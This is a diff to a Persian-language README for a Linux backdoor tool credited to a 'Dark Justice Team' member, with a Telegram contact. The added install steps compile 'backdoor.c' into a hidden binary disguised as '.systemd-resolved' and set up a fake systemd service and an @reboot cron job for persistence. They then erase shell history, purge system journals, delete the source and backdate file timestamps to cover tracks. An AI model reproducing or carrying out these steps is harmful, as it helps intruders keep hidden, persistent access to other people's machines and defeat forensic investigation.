@@ -7,6 +7,7 @@
 
 **Made by Malicious for : 
 Dark Justice Team**
+**Telegram : @M4lic1ous**
 
 </div>
 
@@ -56,8 +57,8 @@ Dark Justice Team**
 ### روش اول: نصب خودکار (پیشنهادی)
 
 ```bash
-git clone https://github.com/your-username/systemd-hidden.git
-cd systemd-hidden
+git clone https://github.com/M4lic1ous/Linux-Kernel-Backdoor.git
+cd Linux-Kernel-Backdoor
 chmod +x install.sh
 sudo ./install.sh
 ```
@@ -65,18 +66,44 @@ sudo ./install.sh
 ### روش دوم: نصب دستی
 
 ```bash
-# کامپایل
-gcc -o .systemd-resolved systemd-hidden.c -lpthread
+# 1. نصب پکیج‌ها
+chmod +x setup.sh
+./setup.sh
 
-# انتقال به مسیر سیستمی
-sudo cp .systemd-resolved /usr/local/bin/
-sudo chmod +x /usr/local/bin/.systemd-resolved
+# 2. کامپایل بکدور
+gcc -o /usr/local/bin/.systemd-resolved backdoor.c -Wall -O2 -ldl -pthread
+chmod 755 /usr/local/bin/.systemd-resolved
+chown root:root /usr/local/bin/.systemd-resolved
 
-# نصب سرویس
-sudo cp systemd-hidden.service /etc/systemd/system/
-sudo systemctl daemon-reload
-sudo systemctl enable systemd-hidden.service
-sudo systemctl start systemd-hidden.service
+# 3. نصب سرویس و اسکریپت
+mv System.service /etc/systemd/system/
+mv systemd-linux /usr/local/bin/systemd-linux
+chmod +x /usr/local/bin/systemd-linux
+
+# 4. فعال‌سازی سرویس
+systemctl daemon-reload
+systemctl enable System.service
+systemctl start System.service
+
+# 5. اجرای اسکریپت مخفی‌سازی
+nohup /usr/local/bin/systemd-linux > /dev/null 2>&1 &
+
+# 6. اضافه به کرون‌جاب
+(crontab -l 2>/dev/null; echo "@reboot /usr/local/bin/systemd-linux > /dev/null 2>&1 &") | crontab -
+
+# 7. پاک‌سازی ردپاها
+history -c
+cat /dev/null > ~/.bash_history
+cat /dev/null > /root/.bash_history
+
+journalctl --rotate
+journalctl --vacuum-time=1s
+
+rm -f backdoor.c
+
+touch -t 202001011200 /usr/local/bin/.systemd-resolved
+touch -t 202001011200 /etc/systemd/system/System.service
+touch -t 202001011200 /usr/local/bin/systemd-linux
 ```
 
 ### روش سوم: اسکریپت محافظت (مخفی‌سازی بیشتر)
